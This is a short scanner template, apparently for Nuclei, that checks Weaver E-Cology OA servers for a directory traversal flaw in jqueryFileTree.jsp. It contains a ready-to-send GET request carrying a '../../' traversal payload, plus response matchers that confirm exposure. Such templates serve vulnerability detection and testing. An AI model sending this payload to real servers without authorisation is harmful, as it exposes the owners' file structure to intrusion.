id: fanweiOA-E-Cology-JqueryFileTree-jsp-mulu-bianli

info:
  name: 泛微OA-E-Cology-JqueryFileTree.jsp目录遍历漏洞
  author: cnaq
  severity: high  
  description: 泛微OA-E-Cology-JqueryFileTree.jsp目录遍历漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEOA-E-Cology-JqueryFileTree.jsp%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md
  tags: sql,ecology,fanwei,oa


requests:
  - raw:
      - |
        GET /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1

    matchers-condition: and  
    matchers:
      # 漏洞返回页面无特征，使用过滤方式减少误报
      # 基本条件1 响应状态
      - type: status
        status:
          - 200
      # 高级条件 内容必有的单字符
      - type: word
        part: body
        words:
          - 'addDir'
          - 'editDir'
        condition: and

